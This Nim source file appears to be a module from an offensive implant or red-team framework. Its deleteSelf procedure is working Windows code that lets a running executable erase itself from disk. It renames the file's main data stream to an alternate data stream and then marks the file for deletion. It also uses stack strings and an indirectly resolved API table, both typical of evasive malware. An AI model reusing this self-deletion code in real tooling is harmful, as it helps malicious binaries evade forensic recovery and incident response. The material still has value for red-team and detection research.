import winim/lean

import utils/[stackstr, stdio]
import instance

proc deleteSelf*(): bool =
  var NEW_STREAM {.stackStringW.} = ":AFTER_BSIDESKC420"

  var
    pLocalAlloc                 = ninst.Win32.LocalAlloc
    pLocalFree                  = ninst.Win32.LocalFree
    pGetLastError               = ninst.Win32.GetLastError
    pGetModuleFileNameW         = ninst.Win32.GetModuleFileNameW
    pCreateFileW                = ninst.Win32.CreateFileW
    pCloseHandle                = ninst.Win32.CloseHandle
    pSetFileInformationByHandle = ninst.Win32.SetFileInformationByHandle

  var 
    szPath: array[MAX_PATH*2, WCHAR]
    delete: FILE_DISPOSITION_INFO
    hFile: HANDLE = INVALID_HANDLE_VALUE
    pRename: PFILE_RENAME_INFO
    newStream: LPWSTR = CWPTR(NEW_STREAM)
    szNewStream: int = (NEW_STREAM.len - 1) * 2
    sRename: int = sizeof(FILE_RENAME_INFO) + szNewStream
  
  pRename = cast[PFILE_RENAME_INFO](pLocalAlloc(LPTR, sRename))
  if cast[int](pRename) == 0:
    PRINTA("[!] LocalAlloc Failed With Error: %i\n".cstring, pGetLastError())
    return false

  ZeroMemory(szPath.addr, sizeof(szPath))
  ZeroMemory(delete.addr, sizeof(FILE_DISPOSITION_INFO))

  delete.DeleteFile = TRUE

  pRename.FileNameLength = cast[DWORD](szNewStream)
  copyMem(pRename.FileName.addr, newStream, pRename.FileNameLength)

  if pGetModuleFileNameW(
    cast[HMODULE](NULL),
    cast[LPWSTR](addr szPath),
    MAX_PATH * 2
  ) == 0:
    PRINTA("[!] GetModuleFileNameW Failed With Error: %i\n".cstring, pGetLastError())
    return false

  hFile = pCreateFileW(
    cast[LPCWSTR](addr szPath),
    DELETE or SYNCHRONIZE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    cast[DWORD](NULL), cast[HANDLE](NULL)
  )
  if hFile == INVALID_HANDLE_VALUE:
    PRINTA("[!] CreateFileW [R] Failed With Error: %i\n".cstring, pGetLastError())
    return false

  if pSetFileInformationByHandle(hFile, cast[FILE_INFO_BY_HANDLE_CLASS](fileRenameInfo), cast[LPVOID](pRename), cast[DWORD](sRename)) == 0:
    PRINTA("[!] SetFileInformationByHandle [R] Failed With Error: %i\n".cstring, pGetLastError())
    return false

  discard pCloseHandle(hFile)

  hFile = pCreateFileW(
    cast[LPCWSTR](addr szPath),
    DELETE or SYNCHRONIZE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    cast[DWORD](NULL), cast[HANDLE](NULL)
  )

  if hFile == INVALID_HANDLE_VALUE and pGetLastError() == ERROR_FILE_NOT_FOUND:
    return true

  if hFile == INVALID_HANDLE_VALUE:
    PRINTA("[!] CreateFileW [D] Failed With Error: %i\n".cstring, pGetLastError())
    return false

  if pSetFileInformationByHandle(hFile, cast[FILE_INFO_BY_HANDLE_CLASS](fileDispositionInfo), delete.addr, cast[DWORD](sizeof(delete))) == 0:
    PRINTA("[!] SetFileInformationByHandle [D] Failed With Error: %i\n".cstring, pGetLastError())
    return false

  discard pCloseHandle(hfile)
  discard pLocalFree(cast[HLOCAL](pRename))
  discard pLocalFree(cast[HLOCAL](newStream))
    
  return true